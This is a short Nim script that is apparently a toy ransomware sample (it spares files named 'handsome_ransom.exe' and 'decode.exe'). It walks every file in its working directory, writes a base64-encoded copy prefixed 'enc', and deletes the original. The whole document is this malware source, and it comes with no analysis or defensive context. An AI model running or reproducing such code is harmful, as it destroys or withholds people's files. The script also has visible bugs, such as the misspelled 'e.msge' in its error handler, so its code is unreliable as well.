import base64, os

let currentDir = getCurrentDir()
for filePath in walkFiles(currentDir & "/*"):
  let name = extractFilename(filePath)
  if name != "handsome_ransom.exe" and name != "decode.exe":
    try:
      let data = readFile(name)
      let encoded = encode(data) 
      writeFile("enc" & name, encoded)
      removeFile(name)
    except IOError as e:
      echo "Error processing file ", name, ": ", e.msge